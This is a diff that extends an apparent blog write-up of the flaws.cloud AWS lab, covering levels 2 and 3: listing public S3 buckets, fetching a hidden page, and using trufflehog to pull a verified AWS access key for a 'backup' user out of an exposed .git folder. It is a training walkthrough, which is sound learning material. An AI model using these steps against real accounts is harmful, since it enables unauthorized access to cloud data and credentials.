@@ -16,6 +16,8 @@ It seems there aren't many resources on cloud pentesting, so I decided to take m
 
 This is more or less the usual process I take whenever I learn a new topic from online resources, only this time I'll be making it public. I'll be focusing on the cloud provider AWS.
 
+For a slightly more readable version, check this post out here
+
 
 ## The plan
 
@@ -404,13 +406,103 @@ Address: 52.92.164.11
 11.164.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
 ```
 
-But anonymous access doesn't work like before. This will require setting up an AWS account
+But anonymous access doesn't work like before. This will require setting up an AWS account and configuring the credentials with the **`aws configure`** command. This should be more or less straight forward
+
+I did run into a problem - `An error occurred (SignatureDoesNotMatch) when calling the GetCallerIdentity operation` - which I believe is related to my Kali's messed up timezone. I play a lot of CTFs and sometimes I have to synchronize my clock with different Kerberos servers. I solved this with **`sudo timedatectl set-ntp true`**
+
+Anyway, after setting up the credentials, the same command will work since it automatically assumes the AWS profile
+
+```
+┌──(kali㉿kali)-[~/.aws]
+└─$ aws s3 ls level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud  
+2017-02-26 21:02:15      80751 everyone.png
+2017-03-02 22:47:17       1433 hint1.html
+2017-02-26 21:04:39       1035 hint2.html
+2017-02-26 21:02:14       2786 index.html
+2017-02-26 21:02:14         26 robots.txt
+2017-02-26 21:02:15       1051 secret-e4443fc.html
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/.aws]
+└─$ curl level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
+<snip>
+ _____  _       ____  __    __  _____
+|     || |     /    ||  |__|  |/ ___/
+|   __|| |    |  o  ||  |  |  (   \_ 
+|  |_  | |___ |     ||  |  |  |\__  |
+|   _] |     ||  _  ||  `  '  |/  \ |
+|  |   |     ||  |  | \      / \    |
+|__|   |_____||__|__|  \_/\_/   \___|
+</pre>
+
+<h1>Congrats! You found the secret file!</h1>
+</center>
+
+
+Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
+```
 
 <TBC>
 
 <br>
 
 ### Level 3
+```
+The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.
+```
+
+Once again confirming we're working with an S3 bucket...
+```
+┌──(kali㉿kali)-[~/.aws]
+└─$ nslookup level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+Server:         10.0.2.3
+Address:        10.0.2.3#53
+
+Non-authoritative answer:
+Name:   level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+<snip>
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/.aws]
+└─$ nslookup 52.92.238.91                                       
+91.238.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
+```
+And listing the files works again. Note how this is a git directory
+```
+┌──(kali㉿kali)-[~/.aws]
+└─$ aws s3 ls level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 
+                           PRE .git/
+2017-02-26 19:14:33     123637 authenticated_users.png
+2017-02-26 19:14:34       1552 hint1.html
+2017-02-26 19:14:34       1426 hint2.html
+2017-02-26 19:14:35       1247 hint3.html
+2017-02-26 19:14:33       1035 hint4.html
+2020-05-22 14:21:10       1861 index.html
+2017-02-26 19:14:33         26 robots.txt
+
+```
+There's this tool called <a href="https://github.com/trufflesecurity/trufflehog">Trufflehog</a> which allows secret scanning on a git directory. What's cool about it is how it also works on S3 buckets, and it actually catches an access key for the user `backup`
+```
+──(kali㉿kali)-[~/Desktop]
+└─$ trufflehog s3 --bucket=level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷
+
+Found verified result 🐷🔑
+Detector Type: AWS                                                                                                                                                                                                                          
+Decoder Type: PLAIN                                                                                                                                                                                                                         
+Raw result: AKIAJ366LIPB4IJKT7SA                                                                                                                                                                                                            
+Account: 975426262029
+User_id: AIDAJQ3H5DC3LEG2BKSLC                                                                                                                                                                                                              
+Arn: arn:aws:iam::975426262029:user/backup                                                                                                                                                                                                  
+Bucket: level3-9afd3927f195e10225021a578e6f78df.flaws.cloud                                                                                                                                                                                 
+Email: Unknown                                                                                                                                                                                                                              
+File: .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2                                                                                                                                                                                
+Link: https://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.us-west-2.amazonaws.com/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2                                                                                         
+Timestamp: 2017-09-17 15:12:25 +0000 UTC                                                                                                                                                                                                    
+                                                                                                                                                                                                                                            
+2025-10-09T12:12:09-04:00       info-0  trufflehog      finished scanning       {"chunks": 73, "bytes": 396944, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "4.155525243s"}
+```
+
+
+
 
 
 
